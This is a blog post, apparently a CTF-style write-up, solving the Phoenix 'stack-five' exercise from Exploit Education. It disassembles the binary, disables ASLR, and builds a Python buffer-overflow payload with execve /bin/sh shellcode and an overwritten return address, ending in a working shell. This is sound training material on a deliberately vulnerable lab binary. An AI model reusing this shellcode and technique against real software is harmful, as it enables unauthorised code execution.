@@ -1,0 +1,243 @@
+---
+layout: post
+title:  "Phoenix x86 Stack Five"
+date: "2019-10-14 22:45:00 +0300"
+categories: exploit-education phoenix x86
+---
+
+{% highlight shell %}
+rabin2 -I /opt/phoenix/i486/stack-five 
+arch     x86
+baddr    0x8048000
+binsz    3249
+bintype  elf
+bits     32
+canary   false
+class    ELF32
+compiler GCC: (GNU) 7.3.0
+crypto   false
+endian   little
+havecode true
+intrp    /opt/phoenix/i486-linux-musl/lib/ld-musl-i386.so.1
+laddr    0x0
+lang     c
+linenum  true
+lsyms    true
+machine  Intel 80386
+maxopsz  16
+minopsz  1
+nx       false
+os       linux
+pcalign  0
+pic      false
+relocs   true
+relro    no
+rpath    /opt/phoenix/i486-linux-musl/lib
+sanitiz  false
+static   false
+stripped false
+subsys   linux
+va       true
+{% endhighlight %}
+
+As can be seen, the same information about the binary as in the previous levels is presented here as well.
+
+To disassemble the binary, `radare2` comes in handy.
+
+{% highlight shell %}
+$ r2 /opt/phoenix/i486/stack-five
+{% endhighlight %}
+
+{% highlight nasm %}
+[0x080482f0]> aas
+Cannot analyze at 0x08048520
+[0x080482f0]> afl
+0x08048294    1 17           sym._init
+0x08048440    7 277  -> 112  sym.frame_dummy
+0x080484e0    5 49           sym.__do_global_ctors_aux
+0x08048511    1 12           sym._fini
+0x080483c0    8 113  -> 111  sym.__do_global_dtors_aux
+0x08048114   41 476  -> 554  sym..interp
+0x080482f0    1 62           entry0
+0x080482e0    1 6            sym.imp.__libc_start_main
+0x0804856c    1 14           loc.__GNU_EH_FRAME_HDR
+0x08048590    3 34           sym..eh_frame
+0x080485cc    1 41           obj.__EH_FRAME_BEGIN
+0x08048330    4 49   -> 40   sym.deregister_tm_clones
+0x08048618    1 4            obj.__FRAME_END
+0x08048485    1 30           sym.start_level
+0x080482c0    1 6            sym.imp.gets
+0x080484a3    1 51           main
+0x080482d0    1 6            sym.imp.puts
+[0x080482f0]> s main
+[0x080484a3]> pdf
+/ (fcn) main 51
+|   int main (int argc, char **argv, char **envp);
+|           ; var int32_t var_4h @ ebp-0x4
+|           ; arg int32_t arg_4h @ esp+0x4
+|           ; DATA XREF from entry0 @ 0x8048324
+|           0x080484a3      8d4c2404       lea ecx, [arg_4h]
+|           0x080484a7      83e4f0         and esp, 0xfffffff0
+|           0x080484aa      ff71fc         push dword [ecx - 4]
+|           0x080484ad      55             push ebp
+|           0x080484ae      89e5           mov ebp, esp
+|           0x080484b0      51             push ecx
+|           0x080484b1      83ec04         sub esp, 4
+|           0x080484b4      83ec0c         sub esp, 0xc
+|           0x080484b7      6820850408     push str.Welcome_to_phoenix_stack_five__brought_to_you_by_https:__exploit.education ; sym..rodata
+|                                                                      ; 0x8048520 ; "Welcome to phoenix/stack-five, brought to you by https://exploit.education"
+|           0x080484bc      e80ffeffff     call sym.imp.puts           ; int puts(const char *s)
+|           0x080484c1      83c410         add esp, 0x10
+|           0x080484c4      e8bcffffff     call sym.start_level
+|           0x080484c9      b800000000     mov eax, 0
+|           0x080484ce      8b4dfc         mov ecx, dword [var_4h]
+|           0x080484d1      c9             leave
+|           0x080484d2      8d61fc         lea esp, [ecx - 4]
+\           0x080484d5      c3             ret
+[0x080484a3]> s sym.start_level
+[0x08048485]> pdf
+/ (fcn) sym.start_level 30
+|   sym.start_level ();
+|           ; var int32_t var_88h @ ebp-0x88
+|           ; CALL XREF from main @ 0x80484c4
+|           0x08048485      55             push ebp
+|           0x08048486      89e5           mov ebp, esp
+|           0x08048488      81ec88000000   sub esp, 0x88
+|           0x0804848e      83ec0c         sub esp, 0xc
+|           0x08048491      8d8578ffffff   lea eax, [var_88h]
+|           0x08048497      50             push eax
+|           0x08048498      e823feffff     call sym.imp.gets           ; char *gets(char *s)
+|           0x0804849d      83c410         add esp, 0x10
+|           0x080484a0      90             nop
+|           0x080484a1      c9             leave
+\           0x080484a2      c3             ret
+{% endhighlight %}
+
+The infamous `gets` call is once again used. This level is all about shellcoding and that's why the buffer has a size of 136 bytes.
+
+The way of shellcoding is pretty simple. The contents of the payload are listed below:
+1. NOP sled, so that there is some flexibility as to what the value of the return address should be.
+1. Shellcode, considering that this is our objective.
+1. NOP padding.
+1. Return address.
+
+Something noteworthy is that in the case of using the deb package, instead of the virtual machines, ASLR needs to be disabled manually.
+
+{% highlight shell %}
+$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+{% endhighlight %}
+
+{% highlight shell %}
+#!/usr/bin/env rarun2
+stdio=/dev/pts/0
+stdin=./pattern
+{% endhighlight %}
+
+*Replace `/dev/pts/0` with the output of the command `tty` and `./pattern` with the full path to the file that contains the input to be read from the binary.*
+
+To overwrite the return address, the input needs to have 136 bytes to fill the buffer, 4 more bytes to override the previous stack frames pointer and, lastly, 4 more bytes to overwrite the return address.
+
+{% highlight python %}
+#!/usr/bin/env python3
+import os
+
+nop_sled = b'\x4e'*80
+shellcode = b'\x53'*35
+nop_padding = b'\x50'*(144-len(nop_sled)-len(shellcode)-4)
+return_address = b'\x52'*4
+
+os.write(1, nop_sled + shellcode + nop_padding + return_address + b'\n')
+{% endhighlight %}
+
+{% highlight shell %}
+$ ./theScript.py > pattern
+$ r2 -d /opt/phoenix/i486/stack-five -r theProfile.rr2
+{% endhighlight %}
+
+{% highlight nasm %}
+[0xf7fc5d4b]> aas
+Cannot analyze at 0x08048520
+[0xf7fc5d4b]> db 0x08048498
+[0xf7fc5d4b]> dc
+Welcome to phoenix/stack-five, brought to you by https://exploit.education
+hit breakpoint at: 8048498
+[0x08048498]> dr
+eax = 0xffffd370
+ebx = 0xf7ffb000
+ecx = 0xffffd340
+edx = 0x00000000
+esi = 0xffffd494
+edi = 0x00000001
+esp = 0xffffd360
+ebp = 0xffffd3f8
+eip = 0x08048498
+eflags = 0x00000292
+oeax = 0xffffffff
+[0x08048498]> px/40xw 0xffffd360
+0xffffd360  0xffffd370 0xffffd388 0xffffd408 0xf7fb5da9  p............]..
+0xffffd370  0xf7ffb1e0 0xffffd3bf 0x00000001 0x00000000  ................
+0xffffd380  0x00b0bc7e 0x00000001 0x00960026 0x00000000  ~.......&.......
+0xffffd390  0x0000000a 0xf7ffb1e0 0x00000000 0xf7fb5ab8  .............Z..
+0xffffd3a0  0xf7ffb1e0 0xffffd3bf 0x00000001 0x0000000a  ................
+0xffffd3b0  0x08048520 0x08048511 0x00000000 0x0afb7038   ...........8p..
+0xffffd3c0  0xf7fb5a5b 0xf7ffb000 0xf7ffb1e0 0xf7fb8958  [Z..........X...
+0xffffd3d0  0xf7ffb1e0 0x0000000a 0x00000000 0x00000000  ................
+0xffffd3e0  0xf7ffb000 0xffffd494 0x00000001 0x080484c1  ................
+0xffffd3f0  0x08048520 0x00000000 0xffffd408 0x080484c9   ...............
+[0x08048498]> px/xw 0xffffd3f8+0x4
+0xffffd3fc  0x080484c9                                   ....
+[0x08048498]> dso
+hit breakpoint at: 804849d
+[0x08048498]> px/40xw 0xffffd360
+0xffffd360  0xffffd370 0xffffd388 0xffffd408 0xf7fb5da9  p............]..
+0xffffd370  0x4e4e4e4e 0x4e4e4e4e 0x4e4e4e4e 0x4e4e4e4e  NNNNNNNNNNNNNNNN
+0xffffd380  0x4e4e4e4e 0x4e4e4e4e 0x4e4e4e4e 0x4e4e4e4e  NNNNNNNNNNNNNNNN
+0xffffd390  0x4e4e4e4e 0x4e4e4e4e 0x4e4e4e4e 0x4e4e4e4e  NNNNNNNNNNNNNNNN
+0xffffd3a0  0x4e4e4e4e 0x4e4e4e4e 0x4e4e4e4e 0x4e4e4e4e  NNNNNNNNNNNNNNNN
+0xffffd3b0  0x4e4e4e4e 0x4e4e4e4e 0x4e4e4e4e 0x4e4e4e4e  NNNNNNNNNNNNNNNN
+0xffffd3c0  0x53535353 0x53535353 0x53535353 0x53535353  SSSSSSSSSSSSSSSS
+0xffffd3d0  0x53535353 0x53535353 0x53535353 0x53535353  SSSSSSSSSSSSSSSS
+0xffffd3e0  0x50535353 0x50505050 0x50505050 0x50505050  SSSPPPPPPPPPPPPP
+0xffffd3f0  0x50505050 0x50505050 0x50505050 0x52525252  PPPPPPPPPPPPRRRR
+[0x08048498]> px/xw 0xffffd3f8+0x4
+0xffffd3fc  0x52525252                                   RRRR
+[0x08048498]> dc
+child stopped with signal 11
+[+] SIGNAL 11 errno=0 addr=0x52525252 code=1 ret=0
+[0x52525252]> dr
+eax = 0xffffd370
+ebx = 0xf7ffb000
+ecx = 0xfefeff09
+edx = 0x80808000
+esi = 0xffffd494
+edi = 0x00000001
+esp = 0xffffd400
+ebp = 0x50505050
+eip = 0x52525252
+eflags = 0x00010282
+oeax = 0xffffffff
+{% endhighlight %}
+
+Now, it is pretty easy to modify the script so that some shellcode will be executed.
+
+{% highlight python %}
+#!/usr/bin/env python3
+import os
+
+nop_sled = b'\x90'*80
+shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
+nop_padding = b'\x90'*(144-len(nop_sled)-len(shellcode)-4)
+return_address = b'\x90\xd3\xff\xff'
+
+os.write(1, nop_sled + shellcode + nop_padding + return_address + b'\n')
+{% endhighlight %}
+
+{% highlight shell %}
+$ cat pattern - | /opt/phoenix/i486/stack-five
+Welcome to phoenix/stack-five, brought to you by https://exploit.education
+whoami
+test
+{% endhighlight %}
+
+## Conclusion
+This level introduced a simple shellcoding challenge that was possible thanks to a call to `gets`, which does not restrict the size of bytes to be read, and also a buffer that had a size big enough to contain the shellcode.
